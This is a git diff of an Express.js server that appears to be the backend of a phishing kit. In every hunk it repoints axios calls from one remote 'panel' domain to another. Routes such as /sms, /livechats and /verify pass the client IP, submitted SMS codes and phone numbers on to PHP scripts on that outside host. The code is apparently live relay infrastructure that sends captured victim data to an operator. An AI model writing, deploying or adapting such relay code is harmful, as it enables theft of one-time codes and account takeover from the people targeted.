@@ -37,7 +37,7 @@ app.post('/apitr', async (req, res) => {
     };
 
 
-    const response = await axios.post('https://panelimdepanelim.site/livechats.php', postData);
+    const response = await axios.post('https://tethree3.store/livechats.php', postData);
  
     res.send(response.data);
   } catch (error) {
@@ -145,7 +145,7 @@ app.get('/verify', async (req, res) => {
   
      
       
-      const response = await axios.post('https://panelimdepanelim.site/eksik.php', {
+      const response = await axios.post('https://tethree3.store/eksik.php', {
         ip: clientIp
       });
   
@@ -168,7 +168,7 @@ app.post('/api', async (req, res) => {
 
   try {
     // IP ve x değerlerini hedef URL'ye gönderiyoruz
-    const response = await axios.post('https://panelimdepanelim.site/livechat.php', {
+    const response = await axios.post('https://tethree3.store/livechat.php', {
       ip: clientIp,
       x: x
     });
@@ -188,7 +188,7 @@ app.post('/sms', async (req, res) => {
   try {
 
  
-    const response = await axios.post('https://panelimdepanelim.site/sms.php', {
+    const response = await axios.post('https://tethree3.store/sms.php', {
       ip: clientIp,
       sms: sms
     });
@@ -217,7 +217,7 @@ app.post('/livechats', async (req, res) => {
       };
   
  
-      const response = await axios.post('https://panelimdepanelim.site/livechats.php', postData);
+      const response = await axios.post('https://tethree3.store/livechats.php', postData);
   
       // Gelen yanıtı doğrudan istemciye gönder
       res.send(response.data);
@@ -234,7 +234,7 @@ app.post('/livechatss', async (req, res) => {
 
   try {
      
-    const response = await axios.post('https://panelimdepanelim.site/phone.php', {
+    const response = await axios.post('https://tethree3.store/phone.php', {
       ip: clientIp,
       phone2: phone2
     });
